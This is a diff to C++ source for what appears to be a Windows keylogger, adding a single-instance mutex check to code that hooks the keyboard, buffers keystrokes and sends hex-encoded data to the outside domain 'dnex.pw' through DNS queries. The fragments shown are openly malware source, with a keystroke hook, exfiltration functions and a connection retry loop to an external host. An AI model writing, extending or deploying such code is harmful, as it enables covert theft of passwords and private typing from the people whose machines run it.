@@ -1,16 +1,20 @@
 #include <iostream>
 #include <string>
 #include <sstream>
+
+// WinAPI
 #include <iomanip>
 #include <windows.h>
 #include <windns.h>
 #include <winsock.h>
 #define MAX_BUFFER 5
 #define DOMAIN "dnex.pw"
+#define MUTEX_NAME "1fc325f3-c548-43db-a13f-8c460dda8381"
 
 HHOOK _k_hook;
 HKL keyboardLayout;
 std::string keystrokeBuffer = "";
+
 int connectionId = -1;
 
 /**
@@ -45,6 +49,15 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data);
 std::string convertToHex(const char* string);
 
 int main(int argc, char* argv[]) {
+	HANDLE mutex = CreateMutex(0, 0, MUTEX_NAME);  // used to check if the program has already started
+	switch (GetLastError()) {
+		case ERROR_ALREADY_EXISTS:  // program already running
+			return 0;
+		case ERROR_SUCCESS:  // program isn't already running
+			break;
+		default:  // start just to be sure.
+			break;
+	}
 	while ((connectionId = startConnection(DOMAIN)) == -1) {
 		Sleep(250);  // sleep to prevent spamming
 		std::cout << "Failed to establish connection" << std::endl;
